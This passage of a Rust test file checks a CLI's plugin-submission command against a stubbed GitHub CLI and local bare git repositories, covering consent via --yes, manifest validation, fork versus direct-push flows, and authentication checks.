    assert!(err.contains(".gif files aren't accepted from this source"), "{err}");
    assert!(leftovers(&h).is_empty(), "{:?}", leftovers(&h));
}

// ---------------------------------------------------------------- 提交

fn write_plugin(h: &Helmp, rel: &str, version: &str) -> PathBuf {
    for (path, body, exec) in files(version, "memo.example.com") {
        let path = h.write(&format!("{rel}/{path}"), &body);
        if exec {
            std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755)).unwrap();
        }
    }
    h.root.join(rel)
}

fn git(dir: &Path, args: &[&str]) -> String {
    let out = Command::new("git")
        .args(args)
        .current_dir(dir)
        .env("GIT_CONFIG_NOSYSTEM", "1")
        .env("GIT_CONFIG_GLOBAL", "/dev/null")
        .env("GIT_AUTHOR_NAME", "Seed")
        .env("GIT_AUTHOR_EMAIL", "seed@example.com")
        .env("GIT_COMMITTER_NAME", "Seed")
        .env("GIT_COMMITTER_EMAIL", "seed@example.com")
        .output()
        .expect("run git");
    assert!(
        out.status.success(),
        "git {args:?}: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    String::from_utf8_lossy(&out.stdout).into_owned()
}

/// 一个有 main 分支的本地裸仓库（假的注册表上游 / fork）。
fn bare_repo(root: &Path, name: &str) -> PathBuf {
    let bare = root.join(name);
    std::fs::create_dir_all(&bare).unwrap();
    git(&bare, &["init", "-q", "--bare", "-b", "main"]);
    let seed = root.join(format!("{name}-seed"));
    std::fs::create_dir_all(seed.join("plugins")).unwrap();
    std::fs::write(seed.join("README.md"), "registry\n").unwrap();
    git(&seed, &["init", "-q", "-b", "main"]);
    git(&seed, &["add", "."]);
    git(&seed, &["commit", "-q", "-m", "seed"]);
    git(&seed, &["push", "-q", bare.to_str().unwrap(), "main"]);
    bare
}

const FAKE_GH: &str = r#"#!/bin/sh
# 假 gh：记录参数，按环境变量给出结果；clone 从本地裸仓库克隆。
printf '%s\n' "$*" >> "$GH_LOG"
case "$1" in
  auth) [ "$FAKE_AUTH" = "no" ] && { echo "not logged in" >&2; exit 1; }; exit 0 ;;
  api)
    case "$2" in
      user) echo tester ;;
      repos/*) echo "$FAKE_PUSH" ;;
    esac ;;
  repo)
    case "$2" in
      clone) git clone -q "$FAKE_UPSTREAM" "$4" ;;
      fork) echo "forked" ;;
      view) echo "$FAKE_FORK" ;;
    esac ;;
  pr)
    while [ $# -gt 0 ]; do
      if [ "$1" = "--body-file" ]; then cp "$2" "$GH_BODY"; fi
      shift
    done
    echo "https://github.com/tester/fake-plugins/pull/7" ;;
esac
"#;

struct FakeGitHub {
    upstream: PathBuf,
    fork: PathBuf,
    log: PathBuf,
    body: PathBuf,
}

fn fake_github(h: Helmp, can_push: bool) -> (Helmp, FakeGitHub) {
    let bin = h.root.join("fakebin");
    std::fs::create_dir_all(&bin).unwrap();
    let gh = bin.join("gh");
    std::fs::write(&gh, FAKE_GH).unwrap();
    std::fs::set_permissions(&gh, std::fs::Permissions::from_mode(0o755)).unwrap();
    let fake = FakeGitHub {
        upstream: bare_repo(&h.root, "upstream.git"),
        fork: bare_repo(&h.root, "fork.git"),
        log: h.root.join("gh.log"),
        body: h.root.join("pr-body.md"),
    };
    let path = format!(
        "{}:{}",
        bin.display(),
        std::env::var("PATH").unwrap_or_default()
    );
    let h = h
        .env("PATH", path)
        .env("HELMP_REGISTRY_REPO", "tester/fake-plugins")
        .env("GH_LOG", fake.log.to_str().unwrap())
        .env("GH_BODY", fake.body.to_str().unwrap())
        .env("FAKE_UPSTREAM", fake.upstream.to_str().unwrap())
        .env("FAKE_FORK", fake.fork.to_str().unwrap())
        .env("FAKE_PUSH", if can_push { "true" } else { "false" })
        .env("GIT_CONFIG_NOSYSTEM", "1")
        .env("GIT_AUTHOR_NAME", "Submitter")
        .env("GIT_AUTHOR_EMAIL", "submitter@example.com")
        .env("GIT_COMMITTER_NAME", "Submitter")
        .env("GIT_COMMITTER_EMAIL", "submitter@example.com");
    (h, fake)
}

fn gh_calls(fake: &FakeGitHub) -> Vec<String> {
    std::fs::read_to_string(&fake.log)
        .unwrap_or_default()
        .lines()
        .map(str::to_string)
        .collect()
}

#[test]
fn submit_without_yes_explains_and_refuses() {
    // 提交会以用户的 GitHub 身份公开发 PR：没有明确的 --yes 就只说明、不动手（agent 必须先问用户）。
    let (h, fake) = fake_github(Helmp::new(), true);
    let dir = write_plugin(&h, "src/memo", "1.0.0");
    let err = h.cli_err(&["plugins", "submit", dir.to_str().unwrap()]);
    assert!(err.contains("--yes"), "{err}");
    assert!(
        gh_calls(&fake).is_empty(),
        "不带 --yes 不能调用 gh：{:?}",
        gh_calls(&fake)
    );
}

#[test]
fn submit_rejects_plugins_the_registry_would_reject() {
    // 没写 license、带隐藏文件：注册表 CI 会拒，提交前就要告诉作者，而不是开一个注定失败的 PR。
    let (h, fake) = fake_github(Helmp::new(), true);
    let dir = write_plugin(&h, "src/memo", "1.0.0");
    std::fs::write(
        dir.join("plugin.json"),
        manifest("1.0.0", "memo.example.com").replace(r#""license":"MIT","#, ""),
    )
    .unwrap();
    std::fs::write(dir.join(".DS_Store"), "x").unwrap();
    let err = h.cli_err(&["plugins", "submit", dir.to_str().unwrap(), "--yes"]);
    assert!(err.contains("license"), "{err}");
    assert!(err.contains(".DS_Store"), "{err}");
    assert!(gh_calls(&fake).is_empty());
}

#[test]
fn submit_with_push_access_opens_a_pr_from_a_branch() {
    // 有推送权限（维护者自己）：直接在注册表上推 plugin/<id>-<版本> 分支并开 PR。
    let (h, fake) = fake_github(Helmp::new(), true);
    let dir = write_plugin(&h, "src/memo", "1.0.0");
    let out = h.cli(&["plugins", "submit", dir.to_str().unwrap(), "--yes"]);
    assert!(
        out.contains("https://github.com/tester/fake-plugins/pull/7"),
        "{out}"
    );

    let branch = format!("plugin/{ID}-1.0.0");
    let tree = git(&fake.upstream, &["ls-tree", "-r", &branch]);
    assert!(
        tree.contains(&format!("100644 blob {}", git_blob(README))),
        "{tree}"
    );
    assert!(
        tree.contains(&format!(
            "100755 blob {}\tplugins/{ID}/bin/hello.sh",
            git_blob(SCRIPT)
        )),
        "{tree}"
    );
    assert!(
        tree.contains(&format!("plugins/{ID}/plugin.json")),
        "{tree}"
    );
    let message = git(&fake.upstream, &["log", "-1", "--format=%s", &branch]);
    assert_eq!(message.trim(), format!("plugin: add {ID} 1.0.0"));

    let calls = gh_calls(&fake);
    assert_eq!(
        calls.first().map(String::as_str),
        Some("auth status"),
        "{calls:?}"
    );
    assert!(
        !calls.iter().any(|c| c.starts_with("repo fork")),
        "有推送权限不该 fork：{calls:?}"
    );
    let pr = calls
        .iter()
        .find(|c| c.starts_with("pr create"))
        .expect("pr create");
    assert!(
        pr.contains(&format!(
            "--repo tester/fake-plugins --base main --head {branch} --title plugin: add {ID} 1.0.0"
        )),
        "{pr}"
    );
    let body = std::fs::read_to_string(&fake.body).unwrap();
    assert!(
        body.contains("Network access: memo.example.com / 访问网络：memo.example.com"),
        "{body}"
    );
    assert!(
        body.contains(&format!(
            "| `bin/hello.sh` | {} | `{}` | yes |",
            SCRIPT.len(),
            sha256(SCRIPT)
        )),
        "{body}"
    );
    assert!(body.contains("- [ ] Permissions are reasonable"), "{body}");
}

#[test]
fn submit_without_push_access_goes_through_a_fork() {
    // 普通用户没有注册表的推送权限：先 fork，把分支推到自己的 fork，再从 fork 开 PR。
    let (h, fake) = fake_github(Helmp::new(), false);
    let dir = write_plugin(&h, "src/memo", "1.0.0");
    let out = h.cli(&["plugins", "submit", dir.to_str().unwrap(), "--yes"]);
    assert!(out.contains("/pull/7"), "{out}");
    let branch = format!("plugin/{ID}-1.0.0");
    assert!(
        git(&fake.fork, &["ls-tree", "-r", "--name-only", &branch])
            .contains(&format!("plugins/{ID}/plugin.json"))
    );
    assert!(
        git(&fake.upstream, &["branch", "--list", &branch])
            .trim()
            .is_empty(),
        "不能推到上游"
    );
    let calls = gh_calls(&fake);
    assert!(
        calls
            .iter()
            .any(|c| c == "repo fork tester/fake-plugins --clone=false --remote=false"),
        "{calls:?}"
    );
    let pr = calls
        .iter()
        .find(|c| c.starts_with("pr create"))
        .expect("pr create");
    assert!(pr.contains(&format!("--head tester:{branch}")), "{pr}");
}

#[test]
fn submit_needs_a_signed_in_gh() {
    let (h, fake) = fake_github(Helmp::new(), true);
    let h = h.env("FAKE_AUTH", "no");
    let dir = write_plugin(&h, "src/memo", "1.0.0");
    let err = h.cli_err(&["plugins", "submit", dir.to_str().unwrap(), "--yes"]);
    assert!(err.contains("gh auth login"), "{err}");
    assert_eq!(gh_calls(&fake), ["auth status"]);
}

/// git 的 blob 哈希（用来核对推上去的文件内容）。
fn git_blob(text: &str) -> String {
    use sha1::{Digest as _, Sha1};
    let mut hasher = Sha1::new();
    hasher.update(format!("blob {}\0", text.len()).as_bytes());
    hasher.update(text.as_bytes());
    hasher
        .finalize()
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect()
}
